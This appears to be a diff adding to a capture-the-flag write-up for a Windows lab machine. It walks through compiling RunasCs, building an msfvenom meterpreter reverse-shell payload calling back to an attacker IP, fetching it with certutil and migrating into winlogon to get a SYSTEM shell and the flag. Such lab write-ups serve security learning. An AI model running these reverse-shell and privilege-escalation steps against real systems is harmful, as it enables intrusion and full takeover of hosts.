@@ -174,4 +174,66 @@ SeDebugPrivilege              Debug programs                 Disabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
+https://github.com/antonioCoco/RunasCs
 
+There a tool calls RunasCs that allows to run specfic processes with different permissions with provided credentials
+
+So i had to open a windows machine
+
+install on it dotnet-runtime-7.0.15-win-x64 and dotnet-sdk-7.0.405-win-x64 to make sure everything is running as it should
+
+after that i needed to download the RunasCs.cs file and compile it to exe file by using:
+
+  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
+
+after that
+
+i needed to upload it to kali via easyupload
+
+create a reverse shell file using msfvenom:
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.120 LPORT=4545 -f exe -o s.exe
+
+now i need to download the file on the machine by using:
+  certutil -urlcache -f http://<my ip>/<filename>.exe <output>.exe
+
+launch the msfconsole for reverse shell using:
+
+  use multi/handler
+
+  set lhost 10.10.16.120
+  set lport 4545
+  run
+
+now i need to launch the RunasCs.exe by using:
+  .\RunasCs.exe alaading <password> "C:\\Users\\alaading\\<SaveFilesFolder>\\s.exe"
+
+So i get the meterpreter reverse shell
+
+now i run the getprivs command to see what privileges i get
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeChangeNotifyPrivilege
+SeDebugPrivilege
+SeIncreaseWorkingSetPrivilege
+
+after that i need to see what PID is running winlogon.exe
+
+using ps to see all processes
+
+winlogon running on PID 568
+
+next i do:
+  migrate 568
+
+going back to msfconsole and use:
+  shell
+
+to get nt authority Privileges and i get the shell
+
+so all that left is to go to Administrator folder and get the flag:
+
+  1344ad3a4b59db2477d5c4c81dca6c1b
